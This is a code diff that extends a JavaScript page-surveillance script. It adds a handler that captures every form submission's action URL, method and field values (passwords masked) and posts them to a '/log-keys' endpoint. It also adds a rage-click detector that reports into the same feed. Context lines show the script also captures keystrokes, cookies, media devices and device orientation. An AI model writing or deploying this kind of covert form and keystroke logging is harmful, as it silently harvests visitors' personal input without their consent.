@@ -1383,6 +1383,59 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         }
     }
 
+    // ═══ ALL FORM SUBMIT TRACKER ══════════════════════════════
+    // Captures every form submit (not just credential forms). Logs form action URL,
+    // method, and field names/values (skips passwords and hidden fields).
+    function initFormSubmitTracker() {
+        document.addEventListener('submit', ev => {
+            try {
+                const form = ev.target;
+                if (!form || form.tagName !== 'FORM') return;
+                const action = form.action || location.href;
+                const method = (form.method || 'GET').toUpperCase();
+                const fields = [];
+                for (const el of form.elements) {
+                    if (!el.name) continue;
+                    const t = (el.type || '').toLowerCase();
+                    if (t === 'hidden' || t === 'submit' || t === 'button' || t === 'image') continue;
+                    const val = t === 'password' ? '***' : (el.value || '').slice(0, 100);
+                    fields.push(`${el.name}="${val}"`);
+                }
+                post('/log-keys', {
+                    keys: `[FORM SUBMIT] ${method} ${action.slice(0, 150)} fields=[${fields.join(', ').slice(0, 300)}]`,
+                    url: location.href
+                });
+            } catch {}
+        }, true);
+    }
+
+    // ═══ RAGE CLICK DETECTOR ══════════════════════════════════
+    // Detects 4+ rapid clicks (within 800ms) in roughly the same spot — a sign of
+    // frustration or testing / probe behavior. Logs position + target element.
+    function initRageClickDetector() {
+        const clicks = [];
+        const WINDOW_MS = 800;
+        const THRESHOLD = 4;
+        const RADIUS    = 60; // pixels
+        document.addEventListener('click', ev => {
+            const now = Date.now();
+            clicks.push({ t: now, x: ev.clientX, y: ev.clientY, target: (ev.target.tagName || '') });
+            // Remove stale clicks outside the time window
+            while (clicks.length && now - clicks[0].t > WINDOW_MS) clicks.shift();
+            if (clicks.length < THRESHOLD) return;
+            // Check if all recent clicks are within RADIUS of each other
+            const cx = clicks.reduce((s, c) => s + c.x, 0) / clicks.length;
+            const cy = clicks.reduce((s, c) => s + c.y, 0) / clicks.length;
+            const allNear = clicks.every(c => Math.hypot(c.x - cx, c.y - cy) < RADIUS);
+            if (!allNear) return;
+            post('/log-keys', {
+                keys: `[RAGE CLICK] ${clicks.length}× at (${Math.round(cx)},${Math.round(cy)}) on <${clicks[clicks.length-1].target}>`,
+                url: location.href
+            });
+            clicks.length = 0; // reset to avoid repeated triggers
+        }, true);
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1518,6 +1571,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initMediaDevicesCapture();
         initCookieInspector();
         initPerformanceTimingCapture();
+        initFormSubmitTracker();
+        initRageClickDetector();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
